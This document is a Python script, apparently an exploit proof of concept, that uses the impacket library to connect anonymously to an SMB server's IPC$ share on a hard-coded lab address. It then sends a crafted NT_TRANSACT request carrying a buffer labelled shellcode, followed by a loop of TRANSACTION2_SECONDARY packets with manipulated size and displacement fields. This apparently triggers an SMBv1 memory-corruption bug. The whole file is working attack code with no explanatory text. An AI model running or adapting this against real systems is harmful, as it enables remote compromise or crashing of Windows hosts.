#*-* coding: utf-8 *-*
import sys
import struct
from impacket import smb, smbconnection

REMOTE_HOST     = "192.168.126.128"
REMOTE_PORT     = "445"
USER_ACCOUNT    = ""
USER_PASSWORD   = ""
USED_DIALECT    = smb.SMB_DIALECT

"""
[MS-CIFS]: 2.2.4.62.1 SMB_COM_NT_TRANSACT request.
:param tid:
:param function: The transaction subcommand code
:param max_param_count:  This field MUST be set as specified in the subsections of Transaction subcommands.
:param setup: Transaction context to the server, depends on transaction subcommand.
:param param: Subcommand parameter bytes if any, depends on transaction subcommand.
:param data: Subcommand data bytes if any, depends on transaction subcommand.
:return: Buffer relative to requested subcommand.
"""
def SendNtTrans( conn, tid, functionID, maxSetupCount, setup, maxDataCount, totalDataCount, data, maxParamCount, totalParamCount, param ):
    smb_packet = smb.NewSMBPacket()
    smb_packet['Tid'] = tid

    #    setup depends on NT_TRANSACT subcommands so it may be 0.
    setup_bytes = struct.pack('<H', setup) if setup != '' else ''

    transCommand = smb.SMBCommand( smb.SMB.SMB_COM_NT_TRANSACT )
    transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
    transCommand['Parameters']['Setup'] = setup_bytes
    transCommand['Parameters']['Function'] = functionID

    transCommand['Parameters']['TotalParameterCount']   = totalParamCount
    transCommand['Parameters']['TotalDataCount']        = totalDataCount

    transCommand['Parameters']['MaxParameterCount'] = maxParamCount
    transCommand['Parameters']['MaxDataCount']      = maxDataCount
    transCommand['Parameters']['MaxSetupCount']     = maxSetupCount

    transCommand['Data'] = smb.SMBNTTransaction_Data()

    # SMB header size + SMB_COM_NT_TRANSACT parameters size + length of setup bytes.
    offset = 32 + 3 + 38 + len(setup_bytes)
    transCommand['Data']['Pad1'] = ''
    if offset % 4 != 0:
        transCommand['Data']['Pad1'] = '\0' * (4 - offset % 4)
        offset += (4 - offset % 4)  # pad1 length

    if len(param) > 0:
        transCommand['Parameters']['ParameterOffset'] = offset
    else:
        transCommand['Parameters']['ParameterOffset'] = 0

    offset += len(param)

    transCommand['Data']['Pad2'] = ''
    if offset % 4 != 0:
        transCommand['Data']['Pad2'] = '\0' * (4 - offset % 4)
        offset += (4 - offset % 4)

    if len(data) > 0:
        transCommand['Parameters']['DataOffset'] = offset
    else:
        transCommand['Parameters']['DataOffset'] = 0

    transCommand['Parameters']['DataCount']         = len(data)
    transCommand['Parameters']['ParameterCount']    = len(param)
    transCommand['Data']['NT_Trans_Parameters']     = param
    transCommand['Data']['NT_Trans_Data']           = data

    smb_packet.addCommand(transCommand)

    conn.sendSMB(smb_packet)

def SendTrans2Secondary( conn, tid, totalParamCount, totalDataCount, paraCount, param, ParaDisplacement, dataCount, data, dataDisplacement, FID ):
    smb_packet = smb.NewSMBPacket()
    smb_packet['Tid']  = tid

    transCommand = smb.SMBCommand( smb.SMB.SMB_COM_TRANSACTION2_SECONDARY )
    transCommand['Parameters']  = smb.SMBTransaction2Secondary_Parameters()
    transCommand['Data']        = smb.SMBTransaction2Secondary_Data()

    transCommand['Parameters']['TotalParameterCount']   = len(param)
    transCommand['Parameters']['TotalDataCount']        = len(data)
    transCommand['Parameters']['FID'] = FID
    transCommand['Parameters']['DataDisplacement']      = dataDisplacement
    transCommand['Parameters']['ParameterDisplacement'] = ParaDisplacement

    if len(param) > 0:
        padLen = (4 - (32+2+18) % 4 ) % 4
        padBytes = '\xFF' * padLen
        transCommand['Data']['Pad1'] = padBytes
    else:
        transCommand['Data']['Pad1'] = ''
        padLen = 0

    transCommand['Parameters']['ParameterOffset'] = 32+2+18+padLen
    transCommand['Parameters']['ParameterCount'] = len(param)


    if len(data) > 0:
        pad2Len = (4 - (32+2+18 +padLen + len(param)) % 4) % 4
        transCommand['Data']['Pad2'] = '\xFF' * pad2Len
    else:
        transCommand['Data']['Pad2'] = ''
        pad2Len = 0

    transCommand['Parameters']['DataCount']  = len(data)
    transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

    transCommand['Data']['Trans_Parameters'] = param
    transCommand['Data']['Trans_Data'] = data

    smb_packet.addCommand(transCommand)

    transCommand['Parameters'].dump();
    transCommand['Data'].dump();

    conn.sendSMB( smb_packet )

if __name__ == "__main__":
    smbConn = smbconnection.SMBConnection( "*\*SMBSERVER*", REMOTE_HOST, preferredDialect=USED_DIALECT, manualNegotiate=True);
    smbConn.negotiateSession(USED_DIALECT, flags2=smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY | smb.SMB.FLAGS2_LONG_NAMES);
    smbConn.login( USER_ACCOUNT, USER_PASSWORD );

    # get tree id
    tid = smbConn.connectTree( u"\\\\192.168.126.128\\IPC$" );

    # get real smb conn object
    smbServer = smbConn.getSMBServer();

    # send nt trans request
    """
    shellcode = struct.pack("<I", 0x10000 );
    SendNtTrans( smbServer, tid, 0x0, 0x1, 0x0, 0x0, 0x10000+976, shellcode+972*'\x00', 30, 30, 30*'\x00' );

    count = 0x10000/4096;
    for i in range(count):
        SendTrans2Secondary( smbServer, tid, 0x0, 4096, 0x0, "", 0x0, 4096, '\x00'*4096, 976+4096*i, 0x0 );
    """
    shellcode = struct.pack("<I", 0x10000 );
    shellcode += struct.pack("<BBH", 0, 0, 0xFFF4 );

    SendNtTrans( smbServer, tid, 0x0, 0x1, 0x0, 0x0, 0x10000+976, shellcode+968*'\x00', 30, 30, 30*'\x00' );

    count = 0x10000/4096;
    for i in range(count):
        SendTrans2Secondary( smbServer, tid, 0x0, 4096, 0x0, "", 0x0, 4096, '\x00'*4096, 976+4096*i, 0x0 );